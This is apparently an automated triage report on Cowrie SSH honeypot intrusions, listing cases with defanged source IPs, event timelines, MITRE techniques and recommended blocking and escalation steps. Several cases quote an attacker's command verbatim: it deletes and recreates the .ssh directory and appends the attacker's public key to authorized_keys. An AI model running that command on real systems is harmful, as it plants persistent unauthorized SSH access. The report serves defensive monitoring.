- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03cb27eebc3b

| Field | Detail |
|---|---|
| **Source IP** | `129.121.99[.]2` |
| **First Seen** | 2026-10-04 03:06 |
| **Last Seen** | 2026-10-04 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:06:52` | `cowrie.session.connect` |
| `2026-10-04 03:06:52` | `cowrie.client.version` |
| `2026-10-04 03:06:52` | `cowrie.client.kex` |
| `2026-10-04 03:06:52` | `cowrie.login.success` |
| `2026-10-04 03:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `129.121.99[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-873cd678c160

| Field | Detail |
|---|---|
| **Source IP** | `103.191.204[.]229` |
| **First Seen** | 2026-10-04 03:06 |
| **Last Seen** | 2026-10-04 03:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:06:54` | `cowrie.session.connect` |
| `2026-10-04 03:06:54` | `cowrie.client.version` |
| `2026-10-04 03:06:54` | `cowrie.client.kex` |
| `2026-10-04 03:06:56` | `cowrie.login.success` |
| `2026-10-04 03:06:56` | `cowrie.direct-tcpip.request` |
| `2026-10-04 03:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.204[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.191.204[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c027a1a60b

| Field | Detail |
|---|---|
| **Source IP** | `36.67.227[.]242` |
| **First Seen** | 2026-10-04 03:08 |
| **Last Seen** | 2026-10-04 03:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:08:25` | `cowrie.session.connect` |
| `2026-10-04 03:08:25` | `cowrie.client.version` |
| `2026-10-04 03:08:26` | `cowrie.client.kex` |
| `2026-10-04 03:08:27` | `cowrie.login.success` |
| `2026-10-04 03:08:28` | `cowrie.session.params` |
| `2026-10-04 03:08:28` | `cowrie.command.input` |
| `2026-10-04 03:08:28` | `cowrie.command.failed` |
| `2026-10-04 03:08:28` | `cowrie.log.closed` |
| `2026-10-04 03:08:29` | `cowrie.session.params` |
| `2026-10-04 03:08:29` | `cowrie.command.input` |
| `2026-10-04 03:08:29` | `cowrie.session.file_download` |
| `2026-10-04 03:08:29` | `cowrie.log.closed` |
| `2026-10-04 03:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.67.227[.]242` to AbuseIPDB if not already reported
- [ ] Block `36.67.227[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-382645e8022a

| Field | Detail |
|---|---|
| **Source IP** | `36.67.227[.]242` |
| **First Seen** | 2026-10-04 03:08 |
| **Last Seen** | 2026-10-04 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:08:30` | `cowrie.session.connect` |
| `2026-10-04 03:08:30` | `cowrie.client.version` |
| `2026-10-04 03:08:30` | `cowrie.client.kex` |
| `2026-10-04 03:08:31` | `cowrie.login.success` |
| `2026-10-04 03:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.67.227[.]242` to AbuseIPDB if not already reported
- [ ] Block `36.67.227[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae92c661b142

| Field | Detail |
|---|---|
| **Source IP** | `50.6.45[.]1` |
| **First Seen** | 2026-10-04 03:15 |
| **Last Seen** | 2026-10-04 03:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:15:12` | `cowrie.session.connect` |
| `2026-10-04 03:15:12` | `cowrie.client.version` |
| `2026-10-04 03:15:12` | `cowrie.client.kex` |
| `2026-10-04 03:15:13` | `cowrie.login.success` |
| `2026-10-04 03:15:14` | `cowrie.session.params` |
| `2026-10-04 03:15:14` | `cowrie.command.input` |
| `2026-10-04 03:15:14` | `cowrie.command.failed` |
| `2026-10-04 03:15:14` | `cowrie.log.closed` |
| `2026-10-04 03:15:15` | `cowrie.session.params` |
| `2026-10-04 03:15:15` | `cowrie.command.input` |
| `2026-10-04 03:15:15` | `cowrie.session.file_download` |
| `2026-10-04 03:15:15` | `cowrie.log.closed` |
| `2026-10-04 03:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.45[.]1` to AbuseIPDB if not already reported
- [ ] Block `50.6.45[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed069354fa3

| Field | Detail |
|---|---|
| **Source IP** | `50.6.45[.]1` |
| **First Seen** | 2026-10-04 03:15 |
| **Last Seen** | 2026-10-04 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:15:16` | `cowrie.session.connect` |
| `2026-10-04 03:15:16` | `cowrie.client.version` |
| `2026-10-04 03:15:16` | `cowrie.client.kex` |
| `2026-10-04 03:15:17` | `cowrie.login.success` |
| `2026-10-04 03:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.45[.]1` to AbuseIPDB if not already reported
- [ ] Block `50.6.45[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fece9919107e

| Field | Detail |
|---|---|
| **Source IP** | `176.12.132[.]63` |
| **First Seen** | 2026-10-04 03:18 |
| **Last Seen** | 2026-10-04 03:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:18:54` | `cowrie.session.connect` |
| `2026-10-04 03:18:55` | `cowrie.client.version` |
| `2026-10-04 03:18:55` | `cowrie.client.kex` |
| `2026-10-04 03:18:56` | `cowrie.login.success` |
| `2026-10-04 03:18:56` | `cowrie.direct-tcpip.request` |
| `2026-10-04 03:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.12.132[.]63` to AbuseIPDB if not already reported
- [ ] Block `176.12.132[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41fe909cb45

| Field | Detail |
|---|---|
| **Source IP** | `150.223.20[.]12` |
| **First Seen** | 2026-10-04 03:18 |
| **Last Seen** | 2026-10-04 03:23 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:18:57` | `cowrie.session.connect` |
| `2026-10-04 03:18:57` | `cowrie.client.version` |
| `2026-10-04 03:18:57` | `cowrie.client.kex` |
| `2026-10-04 03:18:58` | `cowrie.login.success` |
| `2026-10-04 03:18:59` | `cowrie.session.params` |
| `2026-10-04 03:18:59` | `cowrie.command.input` |
| `2026-10-04 03:18:59` | `cowrie.command.failed` |
| `2026-10-04 03:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.223.20[.]12` to AbuseIPDB if not already reported
- [ ] Block `150.223.20[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e452d09fb25

| Field | Detail |
|---|---|
| **Source IP** | `76.132.238[.]43` |
| **First Seen** | 2026-10-04 03:19 |
| **Last Seen** | 2026-10-04 03:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:19:01` | `cowrie.session.connect` |
| `2026-10-04 03:19:01` | `cowrie.client.version` |
| `2026-10-04 03:19:01` | `cowrie.client.kex` |
| `2026-10-04 03:19:03` | `cowrie.login.success` |
| `2026-10-04 03:19:03` | `cowrie.direct-tcpip.request` |
| `2026-10-04 03:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.132.238[.]43` to AbuseIPDB if not already reported
- [ ] Block `76.132.238[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c28d792409

| Field | Detail |
|---|---|
| **Source IP** | `114.219.157[.]97` |
| **First Seen** | 2026-10-04 03:22 |
| **Last Seen** | 2026-10-04 03:27 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:22:52` | `cowrie.session.connect` |
| `2026-10-04 03:22:52` | `cowrie.client.version` |
| `2026-10-04 03:22:52` | `cowrie.client.kex` |
| `2026-10-04 03:22:53` | `cowrie.login.success` |
| `2026-10-04 03:22:54` | `cowrie.session.params` |
| `2026-10-04 03:22:54` | `cowrie.command.input` |
| `2026-10-04 03:22:54` | `cowrie.command.failed` |
| `2026-10-04 03:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.219.157[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.219.157[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e60510fade0

| Field | Detail |
|---|---|
| **Source IP** | `114.219.157[.]97` |
| **First Seen** | 2026-10-04 03:23 |
| **Last Seen** | 2026-10-04 03:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:23:10` | `cowrie.session.connect` |
| `2026-10-04 03:23:10` | `cowrie.client.version` |
| `2026-10-04 03:23:10` | `cowrie.client.kex` |
| `2026-10-04 03:23:11` | `cowrie.login.success` |
| `2026-10-04 03:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.219.157[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.219.157[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a12bc0decd

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-10-04 03:24 |
| **Last Seen** | 2026-10-04 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:24:47` | `cowrie.session.connect` |
| `2026-10-04 03:24:47` | `cowrie.client.version` |
| `2026-10-04 03:24:47` | `cowrie.client.kex` |
| `2026-10-04 03:24:47` | `cowrie.login.success` |
| `2026-10-04 03:24:48` | `cowrie.session.params` |
| `2026-10-04 03:24:48` | `cowrie.command.input` |
| `2026-10-04 03:24:48` | `cowrie.command.failed` |
| `2026-10-04 03:24:48` | `cowrie.log.closed` |
| `2026-10-04 03:24:49` | `cowrie.session.params` |
| `2026-10-04 03:24:49` | `cowrie.command.input` |
| `2026-10-04 03:24:49` | `cowrie.session.file_download` |
| `2026-10-04 03:24:49` | `cowrie.log.closed` |
| `2026-10-04 03:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb382b11fda1

| Field | Detail |
|---|---|
| **Source IP** | `101.89.144[.]254` |
| **First Seen** | 2026-10-04 03:24 |
| **Last Seen** | 2026-10-04 03:29 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:24:47` | `cowrie.session.connect` |
| `2026-10-04 03:24:47` | `cowrie.client.version` |
| `2026-10-04 03:24:47` | `cowrie.client.kex` |
| `2026-10-04 03:24:49` | `cowrie.login.success` |
| `2026-10-04 03:24:50` | `cowrie.session.params` |
| `2026-10-04 03:24:50` | `cowrie.command.input` |
| `2026-10-04 03:24:50` | `cowrie.command.failed` |
| `2026-10-04 03:24:50` | `cowrie.log.closed` |
| `2026-10-04 03:24:51` | `cowrie.session.params` |
| `2026-10-04 03:24:51` | `cowrie.command.input` |
| `2026-10-04 03:24:52` | `cowrie.session.file_download` |
| `2026-10-04 03:24:52` | `cowrie.log.closed` |
| `2026-10-04 03:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.89.144[.]254` to AbuseIPDB if not already reported
- [ ] Block `101.89.144[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10ea4940f160

| Field | Detail |
|---|---|
| **Source IP** | `162.243.147[.]237` |
| **First Seen** | 2026-10-04 03:24 |
| **Last Seen** | 2026-10-04 03:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:24:49` | `cowrie.session.connect` |
| `2026-10-04 03:24:49` | `cowrie.client.version` |
| `2026-10-04 03:24:49` | `cowrie.client.kex` |
| `2026-10-04 03:24:49` | `cowrie.login.success` |
| `2026-10-04 03:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.147[.]237` to AbuseIPDB if not already reported
- [ ] Block `162.243.147[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (269) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-d4f472fc1835 | HIGH | `101.89.144[.]254` | 2026-10-04 03:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5d64a991c76c | HIGH | `120.230.142[.]3` | 2026-10-04 03:25 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-a41da53df7ff | HIGH | `46.188.119[.]26` | 2026-10-04 03:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-13073ac1dff8 | HIGH | `46.188.119[.]26` | 2026-10-04 03:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8adca0167800 | HIGH | `101.13.5[.]26` | 2026-10-04 03:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2235cc6e8496 | HIGH | `121.202.206[.]119` | 2026-10-04 03:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-44e5654bdf8b | HIGH | `187.91.166[.]143` | 2026-10-04 03:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-321fd1c14d53 | HIGH | `200.139.93[.]67` | 2026-10-04 03:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7a5382933297 | HIGH | `94.154.43[.]69` | 2026-10-04 03:43 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-f22977fa62ca | HIGH | `176.53.159[.]196` | 2026-10-04 03:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-02341caad570 | HIGH | `220.128.137[.]164` | 2026-10-04 03:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e4c7e9cab905 | HIGH | `193.112.192[.]91` | 2026-10-04 04:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e7a25efe57b7 | HIGH | `185.227.152[.]135` | 2026-10-04 04:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2b0871006eee | HIGH | `185.227.152[.]135` | 2026-10-04 04:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3bc6837fefab | HIGH | `195.178.110[.]227` | 2026-10-04 04:14 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-27da03f983e5 | HIGH | `176.53.159[.]196` | 2026-10-04 04:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-72684154acf0 | HIGH | `186.215.107[.]189` | 2026-10-04 04:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1317a03e4f85 | HIGH | `34.146.217[.]105` | 2026-10-04 04:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5d25d0ff433a | HIGH | `58.209.82[.]167` | 2026-10-04 04:20 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9d3d5853bb96 | HIGH | `211.46.177[.]174` | 2026-10-04 04:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f4ebf4ece647 | HIGH | `211.46.177[.]174` | 2026-10-04 04:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5f5841990241 | HIGH | `94.154.43[.]69` | 2026-10-04 04:33 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-9914ae8f7fc3 | HIGH | `161.35.169[.]21` | 2026-10-04 04:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-23494e16c1ff | HIGH | `130.12.180[.]51` | 2026-10-04 04:37 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-550747eacc4e | HIGH | `94.154.43[.]69` | 2026-10-04 04:42 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-4ea7eb5ce958 | HIGH | `61.80.224[.]62` | 2026-10-04 05:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-173139de728c | HIGH | `88.218.92[.]31` | 2026-10-04 05:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-74d2bdd261c3 | HIGH | `88.218.92[.]31` | 2026-10-04 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c1e74ccc504d | HIGH | `149.165.174[.]70` | 2026-10-04 05:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0c2e8869e297 | HIGH | `149.165.174[.]70` | 2026-10-04 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9ce5d806ec02 | HIGH | `59.22.68[.]213` | 2026-10-04 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-39223cac9b25 | HIGH | `218.149.235[.]152` | 2026-10-04 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d50411cd3077 | HIGH | `109.160.32[.]44` | 2026-10-04 05:48 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2430edfb7071 | HIGH | `109.160.32[.]44` | 2026-10-04 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1c74e62df771 | HIGH | `195.178.110[.]227` | 2026-10-04 06:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-02717ecca6bc | HIGH | `34.62.182[.]78` | 2026-10-04 06:06 | Y | 2 | 0 | `T1078` |
| IR-4446e346eb5c | HIGH | `34.62.182[.]78` | 2026-10-04 06:06 | Y | 1 | 0 | `T1078` |
| IR-cf9e83962019 | HIGH | `34.62.182[.]78` | 2026-10-04 06:06 | Y | 0 | 0 | `T1078` |
| IR-f3689e1449b7 | HIGH | `144.172.108[.]80` | 2026-10-04 06:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4d22433d6206 | HIGH | `144.172.108[.]80` | 2026-10-04 06:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-99331350b515 | HIGH | `47.84.112[.]45` | 2026-10-04 06:09 | Y | 2 | 0 | `T1078 · T1105` |
| IR-fe24d81d2aea | HIGH | `94.154.43[.]69` | 2026-10-04 06:09 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-1fd8a37dff26 | HIGH | `116.48.138[.]69` | 2026-10-04 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2464737f94e6 | HIGH | `175.206.113[.]91` | 2026-10-04 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-23034321bd7e | HIGH | `115.190.138[.]163` | 2026-10-04 06:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-407cc65ce480 | HIGH | `115.190.138[.]163` | 2026-10-04 06:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a0809f9f0d1d | HIGH | `94.154.43[.]69` | 2026-10-04 06:18 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-463f03aa9eaa | HIGH | `5.196.239[.]131` | 2026-10-04 06:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-59ac2e9061cb | HIGH | `5.196.239[.]131` | 2026-10-04 06:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-21d5dd39accc | HIGH | `85.185.201[.]10` | 2026-10-04 06:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6835b1a257ea | HIGH | `85.185.201[.]10` | 2026-10-04 06:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-09f2dab4631b | HIGH | `209.99.190[.]200` | 2026-10-04 06:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3406d1cb5fbc | HIGH | `209.99.190[.]200` | 2026-10-04 06:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c4a22dbfcbd9 | HIGH | `180.153.91[.]15` | 2026-10-04 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-57fe7b4521a1 | HIGH | `180.153.91[.]15` | 2026-10-04 06:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4deac118f018 | HIGH | `222.110.147[.]58` | 2026-10-04 06:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bf9441197795 | HIGH | `222.110.147[.]58` | 2026-10-04 06:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a98a747212dd | HIGH | `101.47.156[.]21` | 2026-10-04 06:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-006b2ba80b89 | HIGH | `101.47.156[.]21` | 2026-10-04 06:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f7e10ed9cd54 | HIGH | `65.181.127[.]40` | 2026-10-04 06:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aa088f891ca5 | HIGH | `65.181.127[.]40` | 2026-10-04 06:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8b674c7746dc | HIGH | `201.63.223[.]138` | 2026-10-04 06:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fddbbd544deb | HIGH | `201.63.223[.]138` | 2026-10-04 06:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-11c247a0e4d1 | HIGH | `103.147.159[.]91` | 2026-10-04 06:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6c3235e0c403 | HIGH | `103.147.159[.]91` | 2026-10-04 06:38 | Y | 0 | 0 | `T1078 · T1592` |
